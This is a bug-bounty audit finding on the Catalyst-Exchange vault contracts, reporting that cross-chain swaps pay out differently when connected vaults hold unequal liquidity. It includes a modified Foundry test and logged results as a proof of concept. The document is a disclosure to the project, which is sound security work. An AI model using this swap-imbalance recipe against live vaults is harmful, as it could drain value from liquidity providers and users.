# [H] Fund Loss/Gain When There are Different Amounts of Tokens Available in Connected Vaults (Pool) During Swaps

## Summary
Severity: High
Chain: Smart contract
Component: Catalyst-Exchange
Published: 2024-02-02
Source: https://github.com/hats-finance/Catalyst-Exchange-0x3026c1ea29bf1280f99b41934b2cb65d053c9db4/issues/76
Type: hats-finding

## Details
**Github username:** --
**Twitter username:** --
**Submission hash (on-chain):** 0x21c388ec31681c1618ae8b5c39856d9e527a8734ec1c301d04d186fe72e38fbe
**Severity:** high

**Description:**
**Description**\
Units of Liquidity as described by documentation and whitepaper, should be global in order to support pools. It is a unit of measurement that should be accounted when swapping between chains or vaults. As described in whitepaper:
>  The Unit of liquidity is not an intermediate token the user is
exposed to or requires lock and mint bridges, it is the result of a computation based on customizable independent swap curves. 

More information from documentation:
> Each Vault contains 1 or more assets and can be connected to none, one or more other vaults to allow swaps between their assets. When vaults are connected, they form a pool. Within a pool, any asset can be exchanged for any other asset.

> To facilitate swaps between different vaults, tokens are converted into the value abstraction: Units. This is done via the internal price curve of the vault. Using a cross-chain messaging layer, the Units can be transferred to any connected vaults, followed by the conversion of the Units to the desired token.

The problem arises when connected vaults starts to diverge in terms of total amount of tokens available in the pool. When this happens, swap from vault that have more tokens to vault that have less tokens make user lose funds, while swaps from vault that have less tokens to vault that have more tokens let users earn funds. While it seems like an arbitrage opportunity, it is not; because vaults that are available in the Catalyst system should be indepentently useful as described by documentation and whitepaper. 

**Attack Scenario**\
One can create so many scenarios and exploit all of them with ease with the information provided above. To be simplistic I will use the ExampleTest.t.sol and will do just a little modification to it to show the problem.

Let's go step by step and start with setUp:
```solidity
  function setUp() public override {
    // Calls setup() on testCommon
    super.setUp();

    // Create relevant arrays for the vault.
    uint256 numTokens = 2;
    address[] memory assets = new address[](numTokens);
    uint256[] memory init_balances = new uint256[](numTokens);
    uint256[] memory weights = new uint256[](numTokens);

    // Deploy a token
    assets[0] = address(new Token("TEST", "TEST", 18, 1e6));
    init_balances[0] = 1000 * 1e18;
    weights[0] = 1;
    // Deploy another token
    assets[1] = address(new Token("TEST2", "TEST2", 18, 1e6));
    init_balances[1] = 1000 * 1e18;
    weights[1] = 1;

    // Set approvals.
    Token(assets[0]).approve(address(catFactory), init_balances[0] * 2);
    Token(assets[1]).approve(address(catFactory), init_balances[1] * 2);

    vault1 = catFactory.deployVault(
      address(volatileTemplate), assets, init_balances, weights, 10**18, 0, "Example Pool1", "EXMP1", address(CCI)
    );
    vault2 = catFactory.deployVault(
      address(volatileTemplate), assets, init_balances, weights, 10**18, 0, "Example Pool2", "EXMP2", address(CCI)
    );
  }
```
Here we deploy 2 vaults with 1000e18 tokens per token per vault.

Then we will have 3 different cross_chain_swap functions, which first one is the provided in the repo (without any change):
```solidity
  function test_cross_chain_swap() external {
    // We need to set address(CCI) as the allowed caller and address(GARP) as the destination.
    bytes memory approvedRemoteCaller = convertEVMTo65(address(CCI));
    bytes memory remoteGARPImplementation = abi.encode(address(GARP));
    // notice that remoteGARPImplementation needs to be encoded with how the AMB expectes it
    // and approvedRemoteCaller needs to be encoded with how GARP expects it.
    CCI.connectNewChain(DESTINATION_IDENTIFIER, approvedRemoteCaller, remoteGARPImplementation);

    ICatalystV1Vault(vault1).setConnection(
      DESTINATION_IDENTIFIER,
      convertEVMTo65(vault2),
      true
    );

    ICatalystV1Vault(vault2).setConnection(
      DESTINATION_IDENTIFIER,
      convertEVMTo65(vault1),
      true
    );

    // Get the token at index 0 from the vault
    address fromToken = ICatalystV1Vault(vault1)._tokenIndexing(0);
    // Lets also get the to token while we are at it:
    address toToken = ICatalystV1Vault(vault1)._tokenIndexing(1);

    // Make an account for testing
    address alice = makeAddr("Alice");
    uint256 swapAmount = 100 * 10**18;

    payable(alice).transfer(_getTotalIncentive(_INCENTIVE));
    Token(fromToken).transfer(alice, swapAmount);
    vm.prank(alice);
    Token(fromToken).approve(vault1, swapAmount);

    // Define the route as a struct:
    ICatalystV1Structs.RouteDescription memory routeDescription = ICatalystV1Structs.RouteDescription({
        chainIdentifier: DESTINATION_IDENTIFIER,
        toVault: convertEVMTo65(vault2),
        toAccount: convertEVMTo65(alice),
        incentive: _INCENTIVE
    });

    // We need the log emitted by the mock Generalised Incentives implementation.
    vm.recordLogs();
    vm.prank(alice);
    ICatalystV1Vault(vault1).sendAsset{value: _getTotalIncentive(_INCENTIVE)}(
        routeDescription,
        fromToken,
        1,
        swapAmount,
        0,
        alice,
        0,
        hex""
    );
    // Get logs.
    Vm.Log[] memory entries = vm.getRecordedLogs();
    // Decode log.
    (, , bytes memory messageWithContext) = abi.decode(entries[1].data, (bytes32, bytes, bytes));
    // Get GARP message.
    (bytes memory _metadata, bytes memory toExecuteMessage) = getVerifiedMessage(address(GARP), messageWithContext);
    // Process message / Execute the receiveAsset call. This delivers the assets to the user.
    vm.recordLogs();
    GARP.processPacket(_metadata, toExecuteMessage, FEE_RECIPITANT);
    // We need to deliver the ack, so we need to relay another message back:
    entries = vm.getRecordedLogs();
    (, , messageWithContext) = abi.decode(entries[3].data, (bytes32, bytes, bytes));
    (_metadata, toExecuteMessage) = getVerifiedMessage(address(GARP), messageWithContext);
    // Process ack
    vm.recordLogs();
    GARP.processPacket(_metadata, toExecuteMessage, FEE_RECIPITANT);

    uint256 cross_chain_swap_result = Token(toToken).balanceOf(alice);
    console2.log("alice balance:", cross_chain_swap_result);
  }
```
Second one where following lines added before creating address alice:
```solidity
    address bob = makeAddr("bob");
    Token(fromToken).transfer(bob,1000e18);
    Token(toToken).transfer(bob,1000e18);
    vm.startPrank(bob);
    Token(fromToken).approve(vault1,1000e18);
    Token(toToken).approve(vault1,1000e18);
    uint256[] memory tokenAmounts = new uint256[](2);
    tokenAmounts[0] = 1000e18;
    tokenAmounts[1] = 1000e18;
    ICatalystV1Vault(vault1).depositMixed(tokenAmounts,0);
    vm.stopPrank();
```
Third one where following lines added before creating address alice:
```solidity

    // Get the token at index 0 from the vault
    address fromToken = ICatalystV1Vault(vault2)._tokenIndexing(0);
    // Lets also get the to token while we are at it:
    address toToken = ICatalystV1Vault(vault2)._tokenIndexing(1);


    address bob = makeAddr("bob");
    Token(fromToken).transfer(bob,1000e18);
    Token(toToken).transfer(bob,1000e18);
    vm.startPrank(bob);
    Token(fromToken).approve(vault2,1000e18);
    Token(toToken).approve(vault2,1000e18);
    uint256[] memory tokenAmounts = new uint256[](2);
    tokenAmounts[0] = 1000e18;
    tokenAmounts[1] = 1000e18;
    ICatalystV1Vault(vault2).depositMixed(tokenAmounts,0);
    vm.stopPrank();

    // Get the token at index 0 from the vault
    fromToken = ICatalystV1Vault(vault1)._tokenIndexing(0);
    // Lets also get the to token while we are at it:
    toToken = ICatalystV1Vault(vault1)._tokenIndexing(1);
```
As we can see only difference is that before crosschain swap occur, bob comes into play and deposit some amount of tokens (without breaking the proportion) to the vault0 in the second scenario and vault1 in the third scenario.

If we run *forge test --match-contract ExampleTest -vvv*
Output will be:
> [PASS] test_cross_chain_swap() (gas: 761577)
Logs:
  alice balance: 90909090909090910000

> [PASS] test_cross_chain_swap2() (gas: 854562)
Logs:
  alice balance: 47619047619047619000

>[PASS] test_cross_chain_swap3() (gas: 860717)
Logs:
  alice balance: 181818181818181820000

As we can see alice's swap output change according the imbalances between vault while it shouldn't be.

This is the exact opposite mentioned in whitepaper as:
> This paper introduces an autonomous market maker based on local invariants that are
updated solely on local trade execution. Connecting the invariants defines a pool where
assets can be swapped within, independently of where assets are located. Since each
local instance is unaware of other instances, there is no state synchronisation nor an
on-chain representation of the global state.
